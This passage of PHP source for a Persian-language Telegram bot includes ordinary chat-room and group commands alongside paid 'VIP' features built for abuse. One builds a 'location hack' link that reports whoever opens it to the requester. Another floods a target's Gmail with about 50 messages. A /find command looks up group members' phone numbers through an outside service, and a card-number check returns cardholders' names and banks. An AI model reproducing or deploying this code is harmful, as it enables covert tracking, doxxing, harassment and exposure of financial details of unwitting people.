if($card["results"] == "This Card Number Is #Right !"){
$bankbank = $card['information']['bank'];
$InfoInfo = $card['information']['info'];
$firstNamefirstName = $card['information']['firstName'];
$lastNamelastName = $card['information']['lastName'];
if($lastNamelastName == null){
$lastNamelastName = "💤 خالی . . .";
}
if($firstNamefirstName == null){
$firstNamefirstName = "💤 خالی . . .";
}
if($InfoInfo == null){
$InfoInfo = "💤 خالی . . .";
}
if($bankbank == null){
$bankbank = "💤 خالی . . .";
}
$finish = microtime(true);
$ms = round($finish - $starts,3);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄

✅ شماره کارت ارسال شده معتبر می‌باشد

● card  : $text
○ First Name  : $firstNamefirstName
○ Last Name  : $lastNamelastName
○ Bank Name  : $bankbank
○ Other Info  : $InfoInfo
● 𝓢𝓔𝓡𝓐𝓒𝓗 𝓣𝓘𝓜𝓔 : $ms ms

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••

",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❗️ لطفاً فقط *شماره کارت* را ارسال کنید و فقط عدد ارسال کنید از *( , . : ! ؟ )* استفاده نکنید بین شماره کارت
❗️*شماره کارت* را بصورت *انگلیسی* وارد کنید
",
'parse_mode'=>'MarkDown',
'reply_markup'=>$menu
]);
}
}
if($text == "🌏 | هک لوکیشن" and $type == "vip"){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
if($coin >= 5){
$rand = Random();
mkdir("../location");
mkdir("../location/$rand");
$post = file_get_contents("RQO/Location.php");
$post = str_replace("[*[ADMIN]*]",$from_id,$post);
file_put_contents("../location/$rand/Location.php",$post);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🎉 | لینک هک شما ساخته شد . . .
🎈 | فقط کافیه این لینک پایین رو برای دوستت ارسال کنی وقتی دوستت روی لینک کلیک کنه لوکشینش رو برات میفرستم . . .
",
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
دوست داری بدونی دوستات کجا هستن ؟ 🤔

این که کاری نداره 😕

فقط کافیه بری داخل این سایت و شماره اشو بزنی و لوکشینش رو پیدا کنی 🤫

$link/location/$rand/Location.php
",
]);
$datas = json_decode(file_get_contents("data/$from_id/$from_id.json"),true);
$coin = $datas["coin"];
$newcoin = $coin - 5;
$datas["coin"] = $newcoin;
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"📌 | جهت هک لوکشین به `5` سکه لازم دارید . . .",
'parse_mode'=>'Markdown', 
'reply_markup'=>$menu
]);
}
}

if($text == "🔐 | اطلاعات آیپی" and $type == "vip"){
$datas["step"] = "dldldldls";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🔎 | جهت دریافت اطلاعات آی پی مورد نظر آی پی را بصورت `34.227.88.233` ارسال کنید . . .
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
if($step == "dldldldls" and $tc == 'private'){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$finder = json_decode(file_get_contents("http://ip-api.com/json/$text"));
$status = $finder->status;
if($text != true){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ | ای پی را بصورت متن ارسال کنید . . . !
",
'reply_markup'=>$menu
]);
exit();
}
if($status == "fail"){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ | ای پی وارد شده اشتباه است مجدد تلاش کنید !
",
'reply_markup'=>$menu
]);
}else{
$finder = json_decode(file_get_contents("http://ip-api.com/json/$text"));
$zip = $finder->zip;
$time_zone = $finder->timezone;
$status = $finder->status;
$regionName = $finder->regionName;
$region = $finder->region;
$query = $finder->query;
$org = $finder->org;
$lat = $finder->lat;
$lon = $finder->lon;
$isp = $finder->isp;
$country_code = $finder->countryCode;
$country_name = $finder->country;
$city = $finder->city;
$as = $finder->as;
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
اطلاعات آی پی مورد نظر 👇🏻

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
as : $as
status : $status
city : $city
lon : $lon
isp : $isp
lat : $lat
org : $org
country : $country_name
country code : $country_code
query : $query
region : $region
region name : $regionName
timezone : $time_zone
zip : $zip
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••

",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}
}
if($text == "🔰 | انکدر" and $type == "vip"){
$datas["step"] = "encodes";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
📝 | متن خود را جهت انکد ارسال کنید . . .
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
if($step == "encodes" and $tc == 'private'){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
if($text != true){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ | فقط ارسال متن مجاز است . . . !
",
'reply_markup'=>$menu
]);
}else{
$mtn = base64_encode($text);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ با موفقیت متن شما انکد شد

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
$mtn
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••

",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}
}
if($text == "🔰 | دیکدر" and $type == "vip"){
$datas["step"] = "decodes";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
📝 | متن خود را جهت دیکد ارسال کنید . . .
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
if($step == "decodes" and $tc == 'private'){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
if($text != true){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ | فقط ارسال متن مجاز است . . . !
",
'reply_markup'=>$menu
]);
}else{
$mtn = base64_decode($text);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ با موفقیت متن شما دیکد شد

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
$mtn
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••

",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}
}

if($text == "💤 | اسپم جیمیل" and $type == "vip"){
$datas["step"] = "fofofol";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
📧 | جیمیل هدف را ارسال کنید بصورت کامل . . .
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
if($step == "fofofol" and $tc == 'private'){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ | درحال اسپم به جیمیل `$text` 
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
for ($i=0; $i <= 50; $i++){
mail("$text","✅ Your email was spammed","@$botuser","ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇᴅ sᴘᴀᴍ ᴀᴛ $time ᴏ'ᴄʟᴏᴄᴋ");
}
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ | جیمیل هدف $text با موفقیت در ساعت $time و تاریخ $date اسپم شد . . .

",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}
//====[CHAT]====//
if($text == "💭 | چت گروهی" and $tc == 'private'){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$dnckdkck = file_get_contents("ChatRoom.txt");
$exp = explode("\n",$dnckdkck);
if(!in_array($from_id,$exp)){
$myfile2 = fopen("ChatRoom.txt", "a") or die("Unable to open file!");
fwrite($myfile2, "$from_id\n");
fclose($myfile2);
$all_member = fopen("ChatRoom.txt", "r");
while(!feof( $all_member)){
$user = fgets( $all_member);
bot('sendMessage',[
'chat_id'=>$user,
'text'=>"🎉 کاربر $first_name به گروه چت پیوست !",
]);
}
}
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ با موفقیت وارد گروه چت ربات اِسلُو فایندر شدید


جهت ارسال پیام به اعضای گروه از دکمه 📨 | ارسال پیام استفاده کنید . . . 
",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"📊 | آمار گروه چت"]],
[['text'=>"❌ | بستن چت"],['text'=>"📨 | ارسال پیام"]],
[['text'=>"🍁 | پیام خصوصی"],['text'=>"❗️| گزارش"]],
[['text'=>"🔙 | بازگشت"]],
],'resize_keyboard'=>true,
])
]);
}
$status = file_get_contents("ChatRoom.txt");
$exp = explode("\n",$status);
if($text == "❗️| گزارش" and in_array($from_id,$exp) and $tc == 'private'){
$ChatRoom = file_get_contents("ChatRoom.txt");
$exp = explode("\n",$ChatRoom);
foreach($exp as $k){
$infoname = bot('getChatMember',['chat_id'=>"$k",'user_id'=>"$k"]);
$yournamer = $infoname->result->user->first_name;
$key[] = [['text'=>"$yournamer",'callback_data'=>"report-$k"]];
$i ++;
}
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❓کدام کاربر را میخواهید گزارش کنید",
'reply_markup'=>json_encode([
'inline_keyboard'=>$key
])
]);
}
if($text == "🍁 | پیام خصوصی" and in_array($from_id,$exp) and $tc == 'private'){
$ChatRoom = file_get_contents("ChatRoom.txt");
$exp = explode("\n",$ChatRoom);
foreach($exp as $k){
$infoname = bot('getChatMember',['chat_id'=>"$k",'user_id'=>"$k"]);
$yournamer = $infoname->result->user->first_name;
$key[] = [['text'=>"$yournamer",'callback_data'=>"pm-$k"]];
$i ++;
}
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🍂 به کدام کاربر میخواهید پیام ارسال کنید ؟",
'reply_markup'=>json_encode([
'inline_keyboard'=>$key
])
]);
}
if($text == "❌ | بستن چت" and in_array($from_id,$exp) and $tc == 'private'){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$dcoeockencn = file_get_contents("ChatRoom.txt");
$fncndkckek = str_replace($from_id, "", $dcoeockencn);
file_put_contents("ChatRoom.txt", $fncndkckek);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ با موفقیت از چت خارج شدید . . . 


جهت پیوستن مجدد به چت روی دکمه `💭 | چت گروهی` بزنید . . . 
",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"💭 | چت گروهی"]],
[['text'=>"🔙 | بازگشت"]],
],'resize_keyboard'=>true,
])
]);
$all_member = fopen("ChatRoom.txt", "r");
while(!feof( $all_member)){
$user = fgets( $all_member);
bot('sendMessage',[
'chat_id'=>$user,
'text'=>"🌹 کاربر $first_name از گروه لفت داد",
]);
}
}
if($text == "📊 | آمار گروه چت" and in_array($from_id,$exp) and $tc == 'private'){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
📊 لیست آمار کسانی که تا ساعت `$time` و تا تاریخ `$date` در گروه چت وجود دارند 👇
",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"📊 | آمار گروه چت"]],
[['text'=>"❌ | بستن چت"],['text'=>"📨 | ارسال پیام"]],
[['text'=>"🍁 | پیام خصوصی"],['text'=>"❗️| گزارش"]],
[['text'=>"🔙 | بازگشت"]],
],'resize_keyboard'=>true,
])
]);
$all_member = fopen("ChatRoom.txt", "r");
while(!feof( $all_member)){
$user = fgets( $all_member);
$dnckdkck = file_get_contents("ChatRoom.txt");
$epxname = bot('getChatMember',['chat_id'=>"$user",'user_id'=>"$user"]);
$user_namer = $epxname->result->user->first_name;
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
`$user_namer`
",
'parse_mode'=>'MarkDown',
]);
}
}
if($text == "📨 | ارسال پیام" and in_array($from_id,$exp) and $tc == 'private'){
$datas["step"] = "chat2";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
♻️ پیام خود را ارسال کنید تا برای همه اعضای این چت ارسال کنم . . .
",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"📊 | آمار گروه چت"]],
[['text'=>"❌ | بستن چت"],['text'=>"📨 | ارسال پیام"]],
[['text'=>"🍁 | پیام خصوصی"],['text'=>"❗️| گزارش"]],
[['text'=>"🔙 | بازگشت"]],
],'resize_keyboard'=>true,
])
]);
}
if($step == "chat2" and isset($text) and $text != "🔙 | بازگشت" and $text != "📨 | ارسال پیام" and $text != "📊 | آمار گروه چت" and $text != "❌ | بستن چت" and $text != "💭 | چت گروهی" and $text != "🍁 | پیام خصوصی" and $text != "❗️| گزارش" and $tc == 'private'){
$text = str_replace(["کیر","کص","کصکش","جنده","تخم","گایید","کصشعر","کوص","جق","ننت"],["***","***","***","***","***","***","***","***","***","***"],$text);
if(strlen($text) > 100){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"‏⚠️ خطا : پیام شما نباید بیشتر از صد حرف باشد",
]);
exit();
}
if(preg_match('/^(.*)(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)(.*)|(.*)(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)|(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)(.*)/',$text) ){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"‏⚠️ خطا : لطفا فقط با حروف فارسی چت کنید",
]);
exit();
}
if($type == "vip"){
$random =["🌹","🔰","🥀","❤️","⏰","🔋","🔐","🎈","🎁","📨","🛍"];
$emoji = $random[array_rand($random)];
}else{
$emoji = "❄️";
}
$all_member = fopen("ChatRoom.txt", "r");
while(!feof( $all_member)){
$user = fgets( $all_member);
bot('sendMessage',[
'chat_id'=>$user,
'text'=>"$emoji $first_name : $text",
]);
}
}
elseif(strpos($step, "pvm-") !== false and isset($text) and $text != "🔙 | بازگشت" and $text != "📨 | ارسال پیام" and $text != "📊 | آمار گروه چت" and $text != "❌ | بستن چت" and $text != "💭 | چت گروهی" and $text != "🍁 | پیام خصوصی" and $text != "❗️| گزارش" and $tc == 'private'){
$id = explode("-",$step)[1];
if(strlen($text) > 100){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"‏⚠️ خطا : پیام شما نباید بیشتر از صد حرف باشد",
]);
exit();
}
if(preg_match('/^(.*)(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)(.*)|(.*)(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)|(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)(.*)/',$text) ){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"‏⚠️ خطا : لطفا فقط با حروف فارسی چت کنید",
]);
exit();
}
$infoname = bot('getChatMember',['chat_id'=>"$id",'user_id'=>"$id"]);
$idnamer = $infoname->result->user->first_name;
bot('sendMessage',[
'chat_id'=>$id,
'text'=>"
🔐 شما یک پیام خصوصی از کاربر *( $first_name )* دارید ! 

📂 پیام کاربر : $text
",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🔰 پاسخ",'callback_data'=>"pm-$chat_id"]],
]])
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ پیام شما با موفقیت به `( $idnamer )` ارسال شد ! 
",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"💭 | چت گروهی"]],
[['text'=>"🔙 | بازگشت"]],
],'resize_keyboard'=>true,
])
]);
}
//====[CREATE]====//
elseif($text == "⚙ | ساخت ربات" and $tc == 'private'){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"این بخش در حال حاضر خاموش می‌باشد . . .",
'parse_mode'=>'Markdown', 
'reply_markup'=>$menu
]);
}
//====[GROUP]====//
if($tc == "chat" or $tc == "supergroup"){
if($update->message->new_chat_member->id == $botid){
if(!file_exists("gap/$chat_id")){
mkdir("gap/$chat_id");
}
$gap["admin"] = [];
$gap["answer"] = [];
$gap["hide"] = [];
$outjson = json_encode($gap,true);
file_put_contents("gap/$chat_id/$chat_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🌹 تشکر بابت عضو کردن من در این گروه 😁

📚 راهنما : `/help`

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••
",
'parse_mode'=>'MarkDown',
]);
}
if($text == "/help"){
$infome = bot('getChatMember',['chat_id'=>$chat_id,'user_id'=>$from_id])->result;
if($infome->status == 'creator' or $infome->status == 'administrator' or in_array($from_id,$gap["admin"])){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"📚 راهنمای استفاده از ربات :

• گرفتن اطلاعات کاربر : `/id`

• گرفتن شمار کاربر : `/find`

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••
",
'parse_mode'=>'MarkDown', 
'reply_to_message_id'=>$message_id,
]);
}
}
if($text == "/cancel"){
$infome = bot('getChatMember',['chat_id'=>$chat_id,'user_id'=>$from_id])->result;
if($infome->status == 'creator' or $infome->status == 'administrator' or in_array($from_id,$gap["admin"])){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"💤 با موفقیت لغو شد

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••
",
'parse_mode'=>'MarkDown', 
'reply_to_message_id'=>$message_id,
]);
}
}
if($text == "/answer"){
$infome = bot('getChatMember',['chat_id'=>$chat_id,'user_id'=>$from_id])->result;
if($infome->status == 'creator' or $infome->status == 'administrator' or in_array($from_id,$gap["admin"])){
$datas["step"] = "answer";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🔰 پیام خود را ارسال کنید

❌ برای لغو کردن دستور /cancel را ارسال کنید

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••
",
'parse_mode'=>'MarkDown', 
'reply_to_message_id'=>$message_id,
]);
}
}
if($step == "answer" and $text != "/cancel"){
$datas["step"] = "javab-$text";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"✅ اکنون پاسخ پیام خود را ارسال کنید

❌ برای لغو کردن دستور /cancel را ارسال کنید

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••
",
'parse_mode'=>'MarkDown', 
'reply_to_message_id'=>$message_id,
]);
}
elseif(strpos($step, "javab-") !== false and $text != "/cancel"){
$sets = explode("-",$step)[1];
$gap["answer"]["$sets"] = "$text";
$outjson = json_encode($gap,true);
file_put_contents("gap/$chat_id/$chat_id.json",$outjson);
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"✅ با موفقیت ثبت شد

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••
",
'parse_mode'=>'MarkDown', 
'reply_to_message_id'=>$message_id,
]);
}
if(isset($gap["answer"]["$text"])){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"{$gap["answer"]["$text"]}",
'parse_mode'=>'MarkDown', 
'reply_to_message_id'=>$message_id,
]);
}
if($reply and $text == "/find"){
$infome = bot('getChatMember',['chat_id'=>$chat_id,'user_id'=>$from_id])->result;
if($infome->status == 'creator' or $infome->status == 'administrator' or in_array($from_id,$gap["admin"])){
$starts = microtime(true);
$numm = json_decode(file_get_contents("https://sidepath.ml/finde/finder.php/?key=smoke&id=$reply_id"), true);
if($numm["Result"] == "Number Not Found !"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌ متاسفانه شماره فرد در دیتابیس موجود نمیباشد !
",
'reply_to_message_id'=>$message_id,
]);
}else{
if($numm['Result']['username'] != "@0"){
$user_name_x = $numm['Result']['username'];
}else{
$user_name_x = "𝑛𝑜𝑛𝑒";
}
$finish = microtime(true);
$ms = round($finish - $starts,3);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ | شماره فرد مورد نظر در دیتابیس موجود است با موفقیت پیدا شد 

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄

● ᴺᵁᴹᴮᴱᴿ : +{$numm["Result"]["phone"]}
○ ᴜsᴇʀ ɪᴅ  : {$numm["Result"]["user_id"]}
○ ᴜsᴇʀ ɴᴀᴍᴇ : $user_name_x
● 𝓢𝓔𝓡𝓐𝓒𝓗 𝓣𝓘𝓜𝓔 : $ms ms
◇ ʏᴏᴜʀ ᴜsᴇʀ ɪᴅ : $from_id

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••

",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}
}
}
if($reply and $text == "/id"){
$infouser = bot('getChatMember',['chat_id'=>$chat_id,'user_id'=>$reply_id])->result;
$info_name = $infouser->user->first_name;
$info_user = $infouser->user->username ?? '𝑛𝑜𝑛𝑒';
$info_language = $infouser->user->language_code ?? '𝑛𝑜𝑛𝑒';
$info_bots = $infouser->user->is_bot;
if($info_bots == false){
$GetProfile = GetProfile($reply_id);
if($GetProfile == 'false'){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"📝 اطلاعات این کاربر :

🌹 نام کاربر : $info_name
🔗 یوزرنیم : @$info_user
🆔 ایدی عددی : $reply_id
🔡 زبان : $info_language
🔰 ربات : ❌
",
'parse_mode'=>'HTML', 
]);
}else{
bot('SendPhoto',[
'chat_id'=>$chat_id,
'photo'=>$GetProfile,
'caption'=>"📝 اطلاعات این کاربر :

🌹 نام کاربر : $info_name
🔗 یوزرنیم : @$info_user
🆔 ایدی عددی : $reply_id
🔡 زبان : $info_language
🔰 ربات : ❌
",
'parse_mode'=>'HTML', 
]);
}
}else{
if($infouser->status == 'creator' or $infouser->status == 'administrator'){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"📝 اطلاعات این ربات :

🌹 نام کاربر : $info_name
🔗 یوزرنیم : @$info_user
🆔 ایدی عددی : $reply_id
🔡 زبان : $info_language
🔰 ربات : ✅
🌟 ادمین بودن : ✅
",
'parse_mode'=>'HTML', 
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"📝 اطلاعات این ربات :

🌹 نام کاربر : $info_name
🔗 یوزرنیم : @$info_user
🆔 ایدی عددی : $reply_id
🔡 زبان : $info_language
🔰 ربات : ✅
🌟 ادمین بودن : ❌
",
'parse_mode'=>'HTML', 
]);
}
}
}
if($text == "/me"){
$infouser = bot('getChatMember',['chat_id'=>$chat_id,'user_id'=>$from_id])->result;
$info_name = $infouser->user->first_name;
$info_user = $infouser->user->username ?? '𝑛𝑜𝑛𝑒';
$info_language = $infouser->user->language_code ?? '𝑛𝑜𝑛𝑒';
$info_bots = $infouser->user->is_bot;
if($info_bots == false){
$GetProfile = GetProfile($from_id);
if($GetProfile == 'false'){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"📝 اطلاعات شما :

🌹 نام کاربر : $info_name
🔗 یوزرنیم : @$info_user
🆔 ایدی عددی : $from_id
🔡 زبان : $info_language
🔰 ربات : ❌
",
'parse_mode'=>'HTML', 
]);
}else{
bot('SendPhoto',[
'chat_id'=>$chat_id,
'photo'=>$GetProfile,
'caption'=>"📝 اطلاعات شما :

🌹 نام کاربر : $info_name
🔗 یوزرنیم : @$info_user
🆔 ایدی عددی : $from_id
🔡 زبان : $info_language
🔰 ربات : ❌
",
'parse_mode'=>'HTML', 
]);
}
}else{
